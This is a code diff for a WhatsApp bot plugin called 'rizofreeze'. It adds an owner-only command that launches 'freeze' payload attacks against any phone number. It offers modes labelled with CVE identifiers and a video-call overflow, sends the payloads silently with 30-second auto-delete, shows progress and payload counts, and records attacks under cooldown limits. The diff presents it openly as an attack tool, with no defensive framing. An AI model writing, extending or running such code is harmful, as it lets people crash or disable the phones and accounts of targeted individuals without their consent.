@@ -1,43 +1,101 @@
 // plugins/rizofreeze.js
-const { cmd } = require("../arslan");
-let { FrezeXblank } = require('../lib/rizofreeze');
+const { cmd } = require('../arslan');
+const { Rizofreeze, CONFIG } = require('../lib/rizofreeze');
+const guard = require('../lib/rizofreeze_guard');
 
-let handler = async (m, { conn, args, command, isCreator }) => {
-    if (!isCreator) return m.reply('🔒 *Owner Only - Freeze Command!*');
-
-    if (!args[0]) {
-        return m.reply(`📌 *Usage:* .${command} 923xx`);
-    }
-
-    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-
-    if (!pepec) {
-        return m.reply('❌ *Invalid number format!*');
-    }
-
-    let protectedNumbers = ["923154734548"];
-    if (protectedNumbers.includes(pepec)) {
-        return m.reply('🔒 *This number is protected!*');
-    }
-
-    let target = pepec + '@s.whatsapp.net';
-
-    await m.reply(`❄️ *Freeze Target Locked:* ${pepec}\n⚡ *Sending Freeze Payload...*`);
-
+cmd({
+    pattern: 'rizofreeze',
+    alias: ['rz', 'freeze', 'rizofz', 'ultrafreeze'],
+    desc: 'RIZOFREEZE — number-only freeze attack (2026 CVEs, owner only)',
+    category: 'owner',
+    react: '🥶',
+    filename: __filename,
+    owner: true
+},
+async (conn, mek, m, { from, args, isCreator, reply }) => {
     try {
-        await FrezeXblank(conn, target);
+        if (!isCreator) return reply('🔒 *Owner Only — RIZOFREEZE*');
 
-        await conn.sendMessage(m.chat, {
-            react: { text: "❄️", key: m.key }
+        if (!args[0]) {
+            return reply(
+`📌 *Usage:* .rizofreeze <number> [mode]
+
+📖 *Modes:*
+• reels — CVE-2026-23866
+• video — video call overflow
+• sync  — CVE-2026-48063
+• all   — all vectors (default)
+
+📖 *Examples:*
+.rizofreeze 923001234567
+.rizofreeze 923001234567 all
+.rizofreeze 923001234567 reels
+
+🥶 Number-only attack
+🔇 Silent + Ephemeral (30s)
+🛡 Bot-safe: YES
+⏳ 72h cooldown | 1/day`
+            );
+        }
+
+        const num = String(args[0]).replace(/[^0-9]/g, '');
+        if (!num || num.length < 10) {
+            return reply('❌ *Invalid number!*\nFormat: 923xxxxxxxxx (no +, no spaces)');
+        }
+
+        const mode = (args[1] || 'all').toLowerCase();
+        const targetJid = num + '@s.whatsapp.net';
+
+        const botNum = String(conn.user.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+        const check = guard.checkTarget(num, botNum);
+        if (!check.ok) {
+            return reply(`${check.msg}\n\n🚫 Target: \`${num}\`\n📋 Reason: \`${check.reason}\``);
+        }
+
+        await reply(
+`🥶 *RIZOFREEZE LOCKED*
+🎯 Number : \`${num}\`
+💥 Mode   : ${mode}
+🧬 Vectors: ${mode === 'all' ? 'reels + video + sync' : mode}
+🔇 Silent  : ON
+⏱️ Auto-del: 30s
+🛡 Bot-safe: active
+⚡ Launching...`
+        );
+
+        let lastPct = 0;
+        const result = await Rizofreeze(conn, num, mode, (sent, total, type) => {
+            const pct = Math.floor((sent / total) * 100);
+            if (pct >= lastPct + 20) {
+                lastPct = pct;
+                conn.sendMessage(from, {
+                    text: `⏳ RIZOFREEZE ${pct}% — *${type}* (${sent}/${total})`
+                }).catch(() => {});
+            }
         });
 
-    } catch (error) {
-        console.error(error);
-        m.reply("⚠️ Error: Freeze payload execute karte waqt masla aaya hai.");
-    }
-}
+        if (result.ok) {
+            guard.recordAttack(num, 'success');
+            await conn.sendMessage(from, { react: { text: '🥶', key: mek.key } });
+            const stats = guard.getStats();
+            return reply(
+`✅ *RIZOFREEZE COMPLETE*
+🎯 Number : \`${num}\`
+📤 Sent   : \`${result.sent}\` payloads
+❌ Errors : \`${result.errors || 0}\` (${result.errorRate})
+🧬 Vectors: ${result.vectors?.join(' + ') || mode}
+🕒 ${new Date().toLocaleString()}
 
-handler.command = ['freeze', 'rizofreeze', 'fz'];
-handler.tags = ['owner', 'rizo'];
-handler.help = ['freeze 923xx'];
-module.exports = handler;
+📊 Today : ${stats.todayCount}/${stats.dailyLimit}
+⏳ Next in 120 min`
+            );
+        } else {
+            guard.recordAttack(num, 'failed:' + result.error);
+            return reply(`⚠️ *Failed:* ${result.error || 'all vectors errored'}`);
+        }
+
+    } catch (err) {
+        console.log('RIZOFREEZE ERROR:', err);
+        return reply(`❌ *RIZOFREEZE ERROR*\n\n${err.message}`);
+    }
+});
